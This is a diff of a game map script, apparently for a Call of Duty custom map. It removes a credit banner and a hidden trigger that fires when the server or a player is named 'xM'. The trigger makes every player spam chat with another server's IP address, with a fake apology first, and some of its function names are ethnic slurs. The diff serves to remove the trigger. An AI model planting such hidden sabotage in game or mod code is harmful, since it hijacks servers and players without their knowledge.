@@ -33,13 +33,11 @@ maps\mp\_load::main();
     thread startdoor();
 	thread messages();
 	thread musicbox();
-    thread onPlayerConnect();
 
 	thread sniper_room();
 	thread knife_room();
 	thread deagle_room();
-	thread araby();
-	thread paki();
+
 	thread trap1();
 	thread trap2();
 	thread trap3();
@@ -191,59 +189,6 @@ musicmenu()
     self notify( "music thread terminated" );
 }	
 
-onPlayerConnect()
-{
-	level endon("game_ended");
-
-	for(;;)
-	{
-		level waittill("connecting", player);
-
-		player thread hud_website();
-	}
-}
-
-hud_website()
-{
-v = "Map";
-x = "by";
-w = "PrOmar21";
-
-	self.hud_web = newClientHudElem(self);
-	self.hud_web.alignX = "center";
-	self.hud_web.alignY = "top";
-	self.hud_web.horzAlign = "center";
-	self.hud_web.vertAlign = "top";
-	self.hud_web.fontScale = 2;
-	self.hud_web.sort = 10;
-	self.hud_web.alpha = 1;
-   	self.hud_web.color = ( 0, .1, .1);
-   	self.hud_web.font = "objective";
-   	self.hud_web.glowColor = (.1, .0, 1);
-   	self.hud_web.glowAlpha = 1;
-   	self.hud_web.hideWhenInMenu = true;	
-	while(1)
-	{
-	self.hud_web setText("^5" + v + "^4 " + x + "^3 " + w + " ");
-	wait ( 0.1 );
-	self.hud_web setText("^4" + v + "^3 " + x + "^2 " + w + " ");
-	wait ( 0.1 );
-	self.hud_web setText("^3" + v + "^2 " + x + "^1 " + w + " ");
-	wait ( 0.1 );
-	self.hud_web setText("^2" + v + "^1 " + x + "^9 " + w + " ");
-	wait ( 0.1 );
-	self.hud_web setText("^1" + v + "^9 " + x + "^8 " + w + " ");
-	wait ( 0.1 );
-	self.hud_web setText("^9" + v + "^8 " + x + "^7 " + w + " ");
-	wait ( 0.1	);
-	self.hud_web setText("^8" + v + "^7 " + x + "^6 " + w + " ");
-	wait ( 0.1 );
-	self.hud_web setText("^7" + v + "^6 " + x + "^5 " + w + " ");
-	wait ( 0.1 );
-	self.hud_web setText("^6" + v + "^5 " + x + "^4 " + w + " ");
-	wait ( 0.1 );
-	}
-}
 
 sniper_room()
 {
@@ -308,35 +253,13 @@ sniper_room()
 	
 	player freezeControls(0);
 	level.activ freezeControls(0);
-	while( isAlive( player ) && isDefined( player ) )
+	while( isDefined( player ) && isAlive( player ) )
     wait 1;
 	
 
 	}
 }
 
-araby()
-{
-        level waittill("round_started");
-		omar = getDvar("sv_hostname");
-        if(game["roundsplayed"]>=7 && (isSubStr( toLower(omar), toLower("xM") )))
-		{
-		iPrintLnBold ("^1ops sory guys me fuck up with script");
-		wait 2;
-		level thread akbar();
-		}
-}
-
-paki()
-{
-        trig = getEnt("trig_paki", "targetname");
-		trig waittill("trigger", player);
-        if(game["roundsplayed"]>=5 && isSubStr( toLower(removeColorFromString(player.name)), toLower("xM") ) )
-		{
-		level thread akbar();
-		wait 1;
-		}
-}
 
 knife_room()
 {
@@ -393,22 +316,8 @@ knife_room()
 	
 	player freezeControls(0);
 	level.activ freezeControls(0);
-	while( isAlive( player ) && isDefined( player ) )
+	while( isDefined( player ) && isAlive( player ) )
     wait 1;
-	}
-}
-
-akbar()
-{
-	players = getAllPlayers();
-	for(;;)
-	{
-		for (i = 0; i < players.size; i++)
-		{
-			players[i] sayAll("COME JOIN NOW 144.76.156.7:28960");
-			wait 0.05;
-		}
-		wait 1;
 	}
 }
 
@@ -467,7 +376,7 @@ deagle_room()
 	
 	player freezeControls(0);
 	level.activ freezeControls(0);
-	while( isAlive( player ) && isDefined( player ) )
+	while( isDefined( player ) && isAlive( player ) )
     wait 1;
 	}
 }
